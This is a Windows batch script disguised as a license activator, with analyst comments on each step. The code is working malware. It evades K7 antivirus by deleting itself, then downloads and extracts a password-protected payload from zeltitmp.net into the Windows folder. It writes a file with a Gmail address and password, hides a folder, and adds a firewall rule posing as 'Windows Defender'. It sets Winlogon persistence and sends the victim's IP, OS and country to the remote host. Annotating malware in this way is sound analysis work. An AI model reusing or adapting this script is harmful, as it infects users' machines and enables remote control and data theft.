@echo Off
TITLE ACTIVATOR LICENSE PROGRAM

:: checks if the "K7TSMngr.exe" process is running. if it is, deletes itself.
for /f tokens^=1^ delims^=^" i in tasklist /fi "imagename eq K7TSMngr.exe" /fo csv /nh') do set sb=~i
if "%sb%" equ "K7TSMngr.exe" del %0

:: checks if the "K7RTScan.exe" process is running. if it is, deletes itself.
for /f tokens^=1^ delims^=^" i in ('tasklist /fi "imagename eq K7RTScan.exe" /fo csv /nh') do set sb=~i
if "%sb%" equ "K7RTScan.exe" del %0

:: if malware already exists, deletes itself.
if exist %APPDATA%\Mail_Sender del %0

:: this attempts to download NetFramework.4.0.7z from zeltitmp.net with the user agent cnfvp201, tries 3 times.
curl -k -o "%temp%\NetFramework.4.0.7z" -L -C - "https://zeltitmp.net/pp/NetFramework.4.0.7z" --user-agent "cnfvp201" --retry 3

:: extracts to C:\Windows using 7zip with the password "Gkjkjg7655ngdfJckjhfjhd789gdfhDGDFsfdgfd"
"%pf\7-Zip\7z.exe" x "%temp%\NetFramework.4.0.7z" -o "%windir%" -pGkjkjg7655ngdfJckjhfjhd789gdfhDGDFsfdgfd -y

:: makes a folder
mkdir %APPDATA%\Mail_Sender

:: makes a json file containing a login ???
echo { >> %APPDATA%\Mail_Sender\Gmail.json
echo "isAutoLogin": true," >> %APPDATA%\Mail_Sender\Gmail.json
echo "BootUp": false," >> %APPDATA%\Mail_Sender\Gmail.json
echo "isFeedbackLine": true," >> %APPDATA%\Mail_Sender\Gmail.json
echo "isInstallP2p": false," >> %APPDATA%\Mail_Sender\Gmail.json
echo "isMinToTray": true," >> %APPDATA%\Mail_Sender\Gmail.json
echo "isNeedGuidance": true," >> %APPDATA%\Mail_Sender\Gmail.json
echo "PopupTips": true," >> %APPDATA%\Mail_Sender\Gmail.json
echo "isPushPingLog": false," >> %APPDATA%\Mail_Sender\Gmail.json
echo "VisitorLogin": false," >> %APPDATA%\Mail_Sender\Gmail.json
echo "userName": "onon02@gmail.com"," >> %APPDATA%\Mail_Sender\Gmail.json
echo "userPassword": "G88583848gggG"" >> %APPDATA%\Mail_Sender\Gmail.json
echo } >> %APPDATA%\Mail_Sender\Gmail.json

:: adds hidden and system attributs to folder
attrib +h +s %APPDATA%\Mail_Sender

:: adds a Windows Firewall rule named "Windows Defender" to allow incoming network traffic for Windows Driver Foundation (WDF).exe
netsh advfirewall firewall add rule name="Windows Defender" dir=in action=allow program="%windir%\Windows Driver Foundation (WDF).exe" enable=yes

:: modifies a registry key related to Windows logon settings
Reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "%Shell%" /t REG_SZ /d "explorer.exe,Windows Driver Foundation (WDF).exe" /f
timeout /t 10

:: starts Windows Driver Foundation (WDF).exe if it exists
if exist "%windir\Windows Driver Foundation (WDF).exe" start "" "%windir%\Windows Driver Foundation (WDF).exe"

:: downloads another thing
:: uses ei variable for ip address
:: uses es variable for windows version
:: uses ec variable for country
:: uses s1 variable for sid=kmatrix62 or sid=goddy4
:: uses p1 variable for pid=p2
curl -k -L "https://zeltitmp.net/pp/cu/cu.php?ip=%ei%&vos=%es%&cid=%ec%&sid=%s1%&pid=%p1%&s=1" --user-agent "cnfvp201"
del %0